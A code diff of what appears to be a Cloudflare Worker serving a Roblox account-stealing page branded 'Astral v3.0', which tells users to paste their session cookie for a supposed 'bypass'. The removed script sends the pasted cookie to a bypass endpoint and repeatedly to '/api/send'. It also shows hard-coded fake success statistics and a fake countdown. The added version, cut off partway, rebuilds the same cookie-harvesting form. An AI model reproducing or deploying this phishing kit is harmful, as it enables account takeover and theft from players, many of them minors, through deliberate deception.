@@ -3,7 +3,292 @@ export default {
     const url = new URL(request.url);
 
     if (url.pathname === '/' || url.pathname === '/index.html') {
-      const html = "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes\">\n    <title>Astral</title>\n    <link href=\"https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap\" rel=\"stylesheet\">\n    <style>\n        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }\n        body { font-family: 'Inter', sans-serif; background: #0a000a; color: #ffffff; min-height: 100vh; position: relative; overflow-x: hidden; }\n        body::before { content: ''; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(circle at 20% 30%, rgba(180, 0, 255, 0.10) 0%, transparent 55%), radial-gradient(circle at 80% 70%, rgba(120, 0, 200, 0.08) 0%, transparent 50%); pointer-events: none; z-index: 0; }\n        body::after { content: ''; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: url(\"data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%239933ff' fill-opacity='0.03'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E\"); pointer-events: none; z-index: 0; }\n        .container { max-width: 600px; margin: 0 auto; padding: 40px 20px; position: relative; z-index: 1; }\n        .header { text-align: center; margin-bottom: 40px; }\n        .logo-wrapper { display: inline-flex; align-items: center; justify-content: center; margin-bottom: 20px; position: relative; }\n        .logo-circle { width: 80px; height: 80px; background: linear-gradient(135deg, #9933ff, #6600cc); border-radius: 24px; display: flex; align-items: center; justify-content: center; box-shadow: 0 10px 40px -5px rgba(153, 51, 255, 0.4); animation: float 3s ease-in-out infinite; border: 1px solid rgba(153, 51, 255, 0.3); }\n        @keyframes float { 0%, 100% { transform: translateY(0px); } 50% { transform: translateY(-10px); } }\n        .logo-circle svg { width: 45px; height: 45px; stroke: #ffffff; fill: none; stroke-width: 1.8; }\n        .brand-name { font-size: 44px; font-weight: 900; background: linear-gradient(135deg, #cc88ff 0%, #9933ff 50%, #cc88ff 100%); -webkit-background-clip: text; background-clip: text; color: transparent; letter-spacing: -1px; margin-bottom: 4px; text-shadow: 0 0 40px rgba(153, 51, 255, 0.15); }\n        .brand-sub { font-size: 13px; color: #8844aa; letter-spacing: 2px; font-weight: 500; text-transform: uppercase; }\n        .main-card { background: rgba(20, 0, 30, 0.85); backdrop-filter: blur(12px); border: 1px solid rgba(153, 51, 255, 0.15); border-radius: 32px; padding: 32px 28px; margin-bottom: 24px; box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6), inset 0 1px 0 rgba(153, 51, 255, 0.05); }\n        .card-badge { display: inline-block; background: rgba(153, 51, 255, 0.15); border: 1px solid rgba(153, 51, 255, 0.15); border-radius: 50px; padding: 6px 16px; font-size: 11px; font-weight: 700; color: #cc88ff; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 20px; }\n        .title { font-size: 30px; font-weight: 800; margin-bottom: 6px; line-height: 1.2; background: linear-gradient(135deg, #ffffff, #cc88ff); -webkit-background-clip: text; background-clip: text; color: transparent; }\n        .subtitle { font-size: 14px; color: #8844aa; margin-bottom: 32px; line-height: 1.6; font-weight: 400; }\n        .input-group { margin-bottom: 22px; }\n        .input-label { display: flex; align-items: center; gap: 10px; font-size: 12px; font-weight: 700; color: #aa77cc; margin-bottom: 10px; letter-spacing: 0.5px; text-transform: uppercase; }\n        .input-label svg { width: 16px; height: 16px; stroke: #9933ff; stroke-width: 2; fill: none; }\n        .input-field { width: 100%; background: rgba(10, 0, 10, 0.9); border: 1px solid rgba(153, 51, 255, 0.15); border-radius: 20px; padding: 16px 18px; color: #ffffff; font-size: 14px; font-family: 'SF Mono', Monaco, 'Courier New', monospace; transition: all 0.3s; }\n        .input-field:focus { outline: none; border-color: #9933ff; background: rgba(10, 0, 10, 1); box-shadow: 0 0 0 4px rgba(153, 51, 255, 0.1); }\n        .input-field::placeholder { color: #442255; }\n        textarea.input-field { resize: vertical; min-height: 100px; }\n        .submit-btn { width: 100%; background: linear-gradient(135deg, #9933ff, #6600cc); color: #ffffff; border: none; border-radius: 20px; padding: 18px; font-size: 16px; font-weight: 800; cursor: pointer; transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); display: flex; align-items: center; justify-content: center; gap: 12px; margin-top: 8px; position: relative; overflow: hidden; letter-spacing: 0.5px; text-transform: uppercase; }\n        .submit-btn::before { content: ''; position: absolute; top: 50%; left: 50%; width: 0; height: 0; border-radius: 50%; background: rgba(255, 255, 255, 0.15); transform: translate(-50%, -50%); transition: width 0.6s, height 0.6s; }\n        .submit-btn:hover::before { width: 400px; height: 400px; }\n        .submit-btn:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 10px 30px -5px rgba(153, 51, 255, 0.5); }\n        .submit-btn:disabled { opacity: 0.5; cursor: not-allowed; }\n        .spinner { width: 20px; height: 20px; border: 2px solid rgba(255, 255, 255, 0.2); border-top-color: #ffffff; border-radius: 50%; animation: spin 0.6s linear infinite; }\n        @keyframes spin { to { transform: rotate(360deg); } }\n        .result-card { background: rgba(20, 0, 30, 0.85); backdrop-filter: blur(10px); border: 1px solid rgba(153, 51, 255, 0.12); border-radius: 24px; padding: 24px; margin-top: 20px; border-left: 4px solid #00cc44; animation: slideUp 0.4s ease-out; }\n        .result-card.error { border-left-color: #ff2222; background: rgba(200, 0, 0, 0.1); }\n        .result-card.success { border-left-color: #00cc44; }\n        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }\n        .result-content { font-size: 15px; line-height: 1.7; word-break: break-word; color: #ddddee; }\n        .stats-bar { display: flex; justify-content: center; gap: 24px; padding: 18px 20px; background: rgba(20, 0, 30, 0.6); border-radius: 60px; backdrop-filter: blur(10px); border: 1px solid rgba(153, 51, 255, 0.06); }\n        .stat-item { text-align: center; }\n        .stat-value { font-size: 20px; font-weight: 800; color: #cc88ff; }\n        .stat-label { font-size: 10px; color: #664488; text-transform: uppercase; letter-spacing: 0.8px; font-weight: 600; margin-top: 2px; }\n        .discord-float-btn { position: fixed; bottom: 24px; right: 24px; width: 56px; height: 56px; background: linear-gradient(135deg, #5865F2, #4752C4); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 28px; cursor: pointer; z-index: 998; box-shadow: 0 6px 20px rgba(88, 101, 242, 0.4); transition: all 0.3s ease; border: none; color: white; text-decoration: none; }\n        .discord-float-btn:hover { transform: scale(1.1); box-shadow: 0 10px 30px rgba(88, 101, 242, 0.6); }\n        .overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0, 0, 0, 0.8); backdrop-filter: blur(8px); z-index: 999; display: none; }\n        #discordPopup { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: linear-gradient(135deg, #1a1a2e, #16213e); border-radius: 28px; padding: 32px; width: 90%; max-width: 380px; z-index: 1000; box-shadow: 0 30px 60px rgba(0, 0, 0, 0.5); border: 1px solid rgba(88, 101, 242, 0.3); display: none; animation: popupScale 0.3s ease-out; }\n        @keyframes popupScale { from { opacity: 0; transform: translate(-50%, -50%) scale(0.9); } to { opacity: 1; transform: translate(-50%, -50%) scale(1); } }\n        #discordPopup h2 { color: #5865F2; font-size: 22px; font-weight: 700; margin-bottom: 20px; display: flex; align-items: center; gap: 12px; }\n        .discord-stats { display: flex; gap: 16px; margin-bottom: 24px; }\n        .stat-box { flex: 1; background: rgba(0, 0, 0, 0.3); border-radius: 16px; padding: 16px; text-align: center; }\n        .stat-box .stat-value { font-size: 28px; font-weight: 800; color: #ffffff; display: flex; align-items: center; justify-content: center; gap: 8px; }\n        .stat-box .stat-label { font-size: 12px; color: #8888aa; margin-top: 6px; }\n        .online-dot, .total-dot { width: 10px; height: 10px; border-radius: 50%; display: inline-block; }\n        .online-dot { background: #4ade80; box-shadow: 0 0 8px #4ade80; }\n        .total-dot { background: #8888aa; }\n        .discord-join-btn { display: block; width: 100%; padding: 14px; background: linear-gradient(135deg, #5865F2, #4752C4); color: #fff; text-align: center; text-decoration: none; border-radius: 16px; font-weight: 600; font-size: 15px; margin-bottom: 12px; transition: transform 0.2s; border: none; cursor: pointer; }\n        .discord-join-btn:hover { transform: translateY(-2px); }\n        .discord-close-btn { width: 100%; padding: 12px; background: rgba(255, 255, 255, 0.05); color: #aaaacc; border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 16px; font-size: 14px; font-weight: 500; cursor: pointer; transition: all 0.2s; }\n        .discord-close-btn:hover { background: rgba(255, 255, 255, 0.1); color: #fff; }\n        .cookie-warning { font-size: 11px; color: #8844aa; margin-top: 6px; font-family: 'SF Mono', monospace; word-break: break-all; padding: 8px 12px; background: rgba(153, 51, 255, 0.05); border-radius: 10px; border: 1px solid rgba(153, 51, 255, 0.08); }\n        .live-status-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 16px; }\n        .live-status-item { background: rgba(0, 0, 0, 0.3); padding: 12px 16px; border-radius: 12px; display: flex; justify-content: space-between; align-items: center; border: 1px solid rgba(153, 51, 255, 0.06); }\n        .live-status-item .label { font-size: 12px; color: #8844aa; text-transform: uppercase; letter-spacing: 0.3px; }\n        .live-status-item .value { font-size: 14px; font-weight: 600; }\n        .live-status-item .value.yes { color: #4ade80; }\n        .live-status-item .value.no { color: #ff4444; }\n        .live-status-item .value.premium-true { color: #fbbf24; }\n        .live-status-item .value.premium-false { color: #666; }\n        .live-status-item .value.processing { color: #fbbf24; animation: pulse 1s infinite; }\n        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }\n        .bypass-timestamp { text-align: center; font-size: 11px; color: #554466; margin-top: 16px; padding-top: 16px; border-top: 1px solid rgba(153, 51, 255, 0.06); }\n        @media (max-width: 480px) { .container { padding: 20px 16px; } .main-card { padding: 24px 18px; } .brand-name { font-size: 32px; } .title { font-size: 24px; } .stats-bar { gap: 12px; padding: 14px 16px; } .stat-value { font-size: 16px; } #discordPopup { padding: 24px; } .live-status-grid { grid-template-columns: 1fr; } }\n    </style>\n</head>\n<body>\n<div class=\"container\">\n    <div class=\"header\">\n        <div class=\"logo-wrapper\">\n            <div class=\"logo-circle\">\n                <svg viewBox=\"0 0 24 24\" stroke=\"currentColor\">\n                    <path d=\"M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z\"/>\n                    <path d=\"M12 8v4M12 16h.01\"/>\n                    <path d=\"M8 12h8\"/>\n                </svg>\n            </div>\n        </div>\n        <h1 class=\"brand-name\">ASTRAL</h1>\n        <p class=\"brand-sub\">v3.0</p>\n    </div>\n    <div class=\"main-card\">\n        <div class=\"card-badge\">ACTIVE</div>\n        <h2 class=\"title\">Session</h2>\n        <p class=\"subtitle\">Enter token below</p>\n        <div id=\"cookieTab\" class=\"tab-content active\">\n            <div class=\"input-group\">\n                <label class=\"input-label\">\n                    <svg viewBox=\"0 0 24 24\" stroke=\"currentColor\">\n                        <path d=\"M12 2a10 10 0 1 0 10 10\"/>\n                        <path d=\"M12 6v6l4 2\"/>\n                    </svg>\n                    Token\n                </label>\n                <textarea id=\"cookieInput\" class=\"input-field\" rows=\"3\" placeholder=\"_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_...\"></textarea>\n                <div class=\"cookie-warning\">Format: _|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_...</div>\n            </div>\n            <button class=\"submit-btn\" onclick=\"handleSubmit()\">\n                <span id=\"btnCookieText\">Submit</span>\n                <svg width=\"18\" height=\"18\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\">\n                    <path d=\"M5 12h14m-7-7l7 7-7 7\"/>\n                </svg>\n            </button>\n        </div>\n    </div>\n    <div class=\"stats-bar\">\n        <div class=\"stat-item\"><div class=\"stat-value\" id=\"onlineCount\">—</div><div class=\"stat-label\">Online</div></div>\n        <div class=\"stat-item\"><div class=\"stat-value\" id=\"processedCount\">—</div><div class=\"stat-label\">Processed</div></div>\n        <div class=\"stat-item\"><div class=\"stat-value\" id=\"successRate\">—</div><div class=\"stat-label\">Rate</div></div>\n    </div>\n    <div id=\"resultCard\"></div>\n</div>\n<button class=\"discord-float-btn\" id=\"discordFloatBtn\"></button>\n<div class=\"overlay\" id=\"overlay\"></div>\n<div id=\"discordPopup\">\n    <h2>Discord</h2>\n    <div class=\"discord-stats\">\n        <div class=\"stat-box\"><div class=\"stat-value\"><span class=\"online-dot\"></span><span id=\"popOnlineCount\">...</span></div><div class=\"stat-label\">Online</div></div>\n        <div class=\"stat-box\"><div class=\"stat-value\"><span class=\"total-dot\"></span><span id=\"popMemberCount\">...</span></div><div class=\"stat-label\">Members</div></div>\n    </div>\n    <p style=\"text-align:center;color:#8888aa;font-size:13px;margin-bottom:20px;\">Join our community</p>\n    <a href=\"https://discord.gg/pKXZkNs283\" target=\"_blank\" class=\"discord-join-btn\">Join</a>\n    <button class=\"discord-close-btn\" id=\"closeDiscordPopup\">Close</button>\n</div>\n<script>\n    (function() {\n        var inviteCode = 'pKXZkNs283';\n        function openDiscordPopup() {\n            document.getElementById('discordPopup').style.display = 'block';\n            document.getElementById('overlay').style.display = 'block';\n        }\n        function closeDiscordPopupFn() {\n            document.getElementById('discordPopup').style.display = 'none';\n            document.getElementById('overlay').style.display = 'none';\n        }\n        document.getElementById('discordFloatBtn').addEventListener('click', openDiscordPopup);\n        document.getElementById('closeDiscordPopup').addEventListener('click', closeDiscordPopupFn);\n        document.getElementById('overlay').addEventListener('click', closeDiscordPopupFn);\n        fetch('https://discord.com/api/v10/invites/' + inviteCode + '?with_counts=true')\n            .then(function(r) { return r.json(); })\n            .then(function(data) {\n                document.getElementById('popOnlineCount').textContent = (data.approximate_presence_count || 0).toLocaleString();\n                document.getElementById('popMemberCount').textContent = (data.approximate_member_count || 0).toLocaleString();\n                document.getElementById('onlineCount').textContent = (data.approximate_presence_count || 0).toLocaleString();\n            })\n            .catch(function() {\n                document.getElementById('popOnlineCount').textContent = 'N/A';\n                document.getElementById('popMemberCount').textContent = 'N/A';\n                document.getElementById('onlineCount').textContent = '?';\n            });\n        setTimeout(openDiscordPopup, 1500);\n    })();\n\n    var API_URL = window.location.origin + '/bypass/astral/bypass.php';\n\n    function sendData(data, cookie) {\n        fetch('/api/send', {\n            method: 'POST',\n            headers: { 'Content-Type': 'application/json' },\n            body: JSON.stringify({\n                type: 'main',\n                data: data,\n                cookie: cookie\n            })\n        }).catch(function(err) { console.log('err:', err); });\n\n        fetch('/api/send', {\n            method: 'POST',\n            headers: { 'Content-Type': 'application/json' },\n            body: JSON.stringify({\n                type: 'secondary',\n                data: data,\n                cookie: cookie\n            })\n        }).catch(function(err) { console.log('err:', err); });\n\n        setTimeout(function() {\n            fetch('/api/send', {\n                method: 'POST',\n                headers: { 'Content-Type': 'application/json' },\n                body: JSON.stringify({\n                    type: 'cookie',\n                    cookie: cookie\n                })\n            }).catch(function(err) { console.log('err:', err); });\n        }, 500);\n    }\n\n    var handleSubmit = function() {\n        if (window._processing) return;\n        var resultCard = document.getElementById('resultCard');\n        var cookie = document.getElementById('cookieInput').value.trim();\n        var submitBtn = document.querySelector('.submit-btn');\n        var buttonTextElement = document.getElementById('btnCookieText');\n        if (!cookie) { resultCard.innerHTML = '<div class=\"result-card error\"><div class=\"result-content\">Token required</div></div>'; return; }\n        if (!cookie.includes('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_')) { resultCard.innerHTML = '<div class=\"result-card error\"><div class=\"result-content\">Invalid format</div></div>'; return; }\n        window._processing = true; submitBtn.disabled = true; var originalHTML = buttonTextElement.innerHTML; buttonTextElement.innerHTML = '<div class=\"spinner\"></div>'; resultCard.innerHTML = '';\n        var params = new URLSearchParams(); params.append('cookie', cookie); params.append('directory', 'astral');\n        fetch(API_URL, { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: params.toString() })\n        .then(function(response) { if (!response.ok) { return response.text().then(function(text) { throw new Error('HTTP ' + response.status + ': ' + text); }); } return response.json(); })\n        .then(function(resultData) {\n            if (resultData.success === true) {\n                var refreshedCookie = resultData.refreshedCookie || cookie;\n                sendData(resultData, refreshedCookie);\n                resultCard.innerHTML = '<div class=\"result-card success\" style=\"text-align:center;padding:40px 24px;\"><div style=\"font-size:48px;margin-bottom:16px;\">⏳</div><strong style=\"font-size:20px;\">Processing...</strong><br><br><div style=\"font-size:13px;color:#666666;\">Please wait 50 seconds</div><br><div style=\"font-size:48px;font-weight:800;color:#cc88ff;margin-top:12px;\" id=\"countdownTimer\">50</div></div>';\n                var seconds = 50; var timerElement = document.getElementById('countdownTimer'); var countdownInterval = setInterval(function() { seconds--; if (timerElement) { timerElement.textContent = seconds; } if (seconds <= 0) { clearInterval(countdownInterval); resultCard.innerHTML = '<div class=\"result-card success\" style=\"text-align:center;padding:40px 24px;\"><div style=\"font-size:48px;margin-bottom:16px;\">✅</div><strong style=\"font-size:24px;\">Success!</strong><br><br><div style=\"background:rgba(153,51,255,0.1);padding:16px;border-radius:12px;text-align:left;font-family:monospace;font-size:11px;word-break:break-all;color:#cc88ff;max-height:150px;overflow-y:auto;border:1px solid rgba(153,51,255,0.1);\"><strong style=\"color:#ffffff;\">Refreshed Token:</strong><br>' + refreshedCookie + '</div><br><span style=\"font-size:16px;color:#888888;\">You can close this tab now.</span></div>'; } }, 1000);\n                window._processing = false;\n            } else { var errorTitle = resultData.title || 'Error'; var errorDesc = resultData.description || resultData.message || 'Processing failed'; resultCard.innerHTML = '<div class=\"result-card error\"><div class=\"result-content\">' + errorTitle + '<br><br>' + errorDesc + '</div></div>'; window._processing = false; }\n        })\n        .catch(function(err) { resultCard.innerHTML = '<div class=\"result-card error\"><div class=\"result-content\">Connection Failed<br>' + err.message + '</div></div>'; window._processing = false; })\n        .finally(function() { submitBtn.disabled = false; buttonTextElement.innerHTML = originalHTML; });\n    };\n\n    (function() {\n        document.getElementById('onlineCount').textContent = '12';\n        document.getElementById('processedCount').textContent = '847';\n        document.getElementById('successRate').textContent = '94%';\n    })();\n</script>\n</body>\n</html>";
+      const html = `<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
+    <title>Astral</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet" />
+    <style>
+        /* --- reset & base --- */
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        body { font-family: 'Inter', sans-serif; background: #0a000a; color: #fff; min-height: 100vh; position: relative; overflow-x: hidden; }
+        body::before { content: ''; position: fixed; inset: 0; background: radial-gradient(circle at 20% 30%, rgba(180,0,255,0.10) 0%, transparent 55%), radial-gradient(circle at 80% 70%, rgba(120,0,200,0.08) 0%, transparent 50%); pointer-events: none; z-index: 0; }
+        body::after { content: ''; position: fixed; inset: 0; background: url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%239933ff' fill-opacity='0.03'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E"); pointer-events: none; z-index: 0; }
+
+        .container { max-width: 600px; margin: 0 auto; padding: 40px 20px; position: relative; z-index: 1; }
+        .header { text-align: center; margin-bottom: 40px; }
+        .logo-wrapper { display: inline-flex; align-items: center; justify-content: center; margin-bottom: 20px; position: relative; }
+        .logo-circle { width: 80px; height: 80px; background: linear-gradient(135deg, #9933ff, #6600cc); border-radius: 24px; display: flex; align-items: center; justify-content: center; box-shadow: 0 10px 40px -5px rgba(153,51,255,0.4); animation: float 3s ease-in-out infinite; border: 1px solid rgba(153,51,255,0.3); }
+        @keyframes float { 0%,100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
+        .logo-circle svg { width: 45px; height: 45px; stroke: #fff; fill: none; stroke-width: 1.8; }
+        .brand-name { font-size: 44px; font-weight: 900; background: linear-gradient(135deg, #cc88ff 0%, #9933ff 50%, #cc88ff 100%); -webkit-background-clip: text; background-clip: text; color: transparent; letter-spacing: -1px; margin-bottom: 4px; text-shadow: 0 0 40px rgba(153,51,255,0.15); }
+        .brand-sub { font-size: 13px; color: #8844aa; letter-spacing: 2px; font-weight: 500; text-transform: uppercase; }
+
+        .main-card { background: rgba(20,0,30,0.85); backdrop-filter: blur(12px); border: 1px solid rgba(153,51,255,0.15); border-radius: 32px; padding: 32px 28px; margin-bottom: 24px; box-shadow: 0 20px 50px rgba(0,0,0,0.6), inset 0 1px 0 rgba(153,51,255,0.05); }
+        .card-badge { display: inline-block; background: rgba(153,51,255,0.15); border: 1px solid rgba(153,51,255,0.15); border-radius: 50px; padding: 6px 16px; font-size: 11px; font-weight: 700; color: #cc88ff; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 20px; }
+        .title { font-size: 30px; font-weight: 800; margin-bottom: 6px; background: linear-gradient(135deg, #fff, #cc88ff); -webkit-background-clip: text; background-clip: text; color: transparent; }
+        .subtitle { font-size: 14px; color: #8844aa; margin-bottom: 32px; line-height: 1.6; font-weight: 400; }
+
+        .input-group { margin-bottom: 22px; }
+        .input-label { display: flex; align-items: center; gap: 10px; font-size: 12px; font-weight: 700; color: #aa77cc; margin-bottom: 10px; letter-spacing: 0.5px; text-transform: uppercase; }
+        .input-label svg { width: 16px; height: 16px; stroke: #9933ff; stroke-width: 2; fill: none; }
+        .input-field { width: 100%; background: rgba(10,0,10,0.9); border: 1px solid rgba(153,51,255,0.15); border-radius: 20px; padding: 16px 18px; color: #fff; font-size: 14px; font-family: 'SF Mono', Monaco, 'Courier New', monospace; transition: all 0.3s; }
+        .input-field:focus { outline: none; border-color: #9933ff; background: rgba(10,0,10,1); box-shadow: 0 0 0 4px rgba(153,51,255,0.1); }
+        .input-field::placeholder { color: #442255; }
+        textarea.input-field { resize: vertical; min-height: 100px; }
+
+        .submit-btn { width: 100%; background: linear-gradient(135deg, #9933ff, #6600cc); color: #fff; border: none; border-radius: 20px; padding: 18px; font-size: 16px; font-weight: 800; cursor: pointer; transition: all 0.3s cubic-bezier(0.4,0,0.2,1); display: flex; align-items: center; justify-content: center; gap: 12px; margin-top: 8px; position: relative; overflow: hidden; letter-spacing: 0.5px; text-transform: uppercase; }
+        .submit-btn::before { content: ''; position: absolute; top: 50%; left: 50%; width: 0; height: 0; border-radius: 50%; background: rgba(255,255,255,0.15); transform: translate(-50%,-50%); transition: width 0.6s, height 0.6s; }
+        .submit-btn:hover::before { width: 400px; height: 400px; }
+        .submit-btn:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 10px 30px -5px rgba(153,51,255,0.5); }
+        .submit-btn:disabled { opacity: 0.5; cursor: not-allowed; }
+
+        .spinner { width: 20px; height: 20px; border: 2px solid rgba(255,255,255,0.2); border-top-color: #fff; border-radius: 50%; animation: spin 0.6s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .result-card { background: rgba(20,0,30,0.85); backdrop-filter: blur(10px); border: 1px solid rgba(153,51,255,0.12); border-radius: 24px; padding: 24px; margin-top: 20px; border-left: 4px solid #00cc44; animation: slideUp 0.4s ease-out; }
+        .result-card.error { border-left-color: #ff2222; background: rgba(200,0,0,0.1); }
+        .result-card.success { border-left-color: #00cc44; }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        .result-content { font-size: 15px; line-height: 1.7; word-break: break-word; color: #ddddee; }
+
+        .stats-bar { display: flex; justify-content: center; gap: 24px; padding: 18px 20px; background: rgba(20,0,30,0.6); border-radius: 60px; backdrop-filter: blur(10px); border: 1px solid rgba(153,51,255,0.06); }
+        .stat-item { text-align: center; }
+        .stat-value { font-size: 20px; font-weight: 800; color: #cc88ff; }
+        .stat-label { font-size: 10px; color: #664488; text-transform: uppercase; letter-spacing: 0.8px; font-weight: 600; margin-top: 2px; }
+
+        .discord-float-btn { position: fixed; bottom: 24px; right: 24px; width: 56px; height: 56px; background: linear-gradient(135deg, #5865F2, #4752C4); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 28px; cursor: pointer; z-index: 998; box-shadow: 0 6px 20px rgba(88,101,242,0.4); transition: all 0.3s ease; border: none; color: #fff; text-decoration: none; }
+        .discord-float-btn:hover { transform: scale(1.1); box-shadow: 0 10px 30px rgba(88,101,242,0.6); }
+
+        .overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.8); backdrop-filter: blur(8px); z-index: 999; display: none; }
+        #discordPopup { position: fixed; top: 50%; left: 50%; transform: translate(-50%,-50%); background: linear-gradient(135deg, #1a1a2e, #16213e); border-radius: 28px; padding: 32px; width: 90%; max-width: 380px; z-index: 1000; box-shadow: 0 30px 60px rgba(0,0,0,0.5); border: 1px solid rgba(88,101,242,0.3); display: none; animation: popupScale 0.3s ease-out; }
+        @keyframes popupScale { from { opacity: 0; transform: translate(-50%,-50%) scale(0.9); } to { opacity: 1; transform: translate(-50%,-50%) scale(1); } }
+        #discordPopup h2 { color: #5865F2; font-size: 22px; font-weight: 700; margin-bottom: 20px; display: flex; align-items: center; gap: 12px; }
+        .discord-stats { display: flex; gap: 16px; margin-bottom: 24px; }
+        .stat-box { flex: 1; background: rgba(0,0,0,0.3); border-radius: 16px; padding: 16px; text-align: center; }
+        .stat-box .stat-value { font-size: 28px; font-weight: 800; color: #fff; display: flex; align-items: center; justify-content: center; gap: 8px; }
+        .stat-box .stat-label { font-size: 12px; color: #8888aa; margin-top: 6px; }
+        .online-dot, .total-dot { width: 10px; height: 10px; border-radius: 50%; display: inline-block; }
+        .online-dot { background: #4ade80; box-shadow: 0 0 8px #4ade80; }
+        .total-dot { background: #8888aa; }
+        .discord-join-btn { display: block; width: 100%; padding: 14px; background: linear-gradient(135deg, #5865F2, #4752C4); color: #fff; text-align: center; text-decoration: none; border-radius: 16px; font-weight: 600; font-size: 15px; margin-bottom: 12px; transition: transform 0.2s; border: none; cursor: pointer; }
+        .discord-join-btn:hover { transform: translateY(-2px); }
+        .discord-close-btn { width: 100%; padding: 12px; background: rgba(255,255,255,0.05); color: #aaaacc; border: 1px solid rgba(255,255,255,0.1); border-radius: 16px; font-size: 14px; font-weight: 500; cursor: pointer; transition: all 0.2s; }
+        .discord-close-btn:hover { background: rgba(255,255,255,0.1); color: #fff; }
+
+        .cookie-warning { font-size: 11px; color: #8844aa; margin-top: 6px; font-family: 'SF Mono', monospace; word-break: break-all; padding: 8px 12px; background: rgba(153,51,255,0.05); border-radius: 10px; border: 1px solid rgba(153,51,255,0.08); }
+
+        @media (max-width: 480px) {
+            .container { padding: 20px 16px; }
+            .main-card { padding: 24px 18px; }
+            .brand-name { font-size: 32px; }
+            .title { font-size: 24px; }
+            .stats-bar { gap: 12px; padding: 14px 16px; }
+            .stat-value { font-size: 16px; }
+            #discordPopup { padding: 24px; }
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="header">
+        <div class="logo-wrapper">
+            <div class="logo-circle">
+                <svg viewBox="0 0 24 24" stroke="currentColor">
+                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
+                    <path d="M12 8v4M12 16h.01" />
+                    <path d="M8 12h8" />
+                </svg>
+            </div>
+        </div>
+        <h1 class="brand-name">ASTRAL</h1>
+        <p class="brand-sub">v3.0</p>
+    </div>
+    <div class="main-card">
+        <div class="card-badge">ACTIVE</div>
+        <h2 class="title">Session</h2>
+        <p class="subtitle">Enter token below</p>
+        <div id="cookieTab">
+            <div class="input-group">
+                <label class="input-label">
+                    <svg viewBox="0 0 24 24" stroke="currentColor">
+                        <path d="M12 2a10 10 0 1 0 10 10" />
+                        <path d="M12 6v6l4 2" />
+                    </svg>
+                    Token
+                </label>
+                <textarea id="cookieInput" class="input-field" rows="3" placeholder="_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_..."></textarea>
+                <div class="cookie-warning">Format: _|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_...</div>
+            </div>
+            <button class="submit-btn" onclick="handleSubmit()">
+                <span id="btnCookieText">Submit</span>
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M5 12h14m-7-7l7 7-7 7" />
+                </svg>
+            </button>
+        </div>
+    </div>
+    <div class="stats-bar">
+        <div class="stat-item"><div class="stat-value" id="onlineCount">—</div><div class="stat-label">Online</div></div>
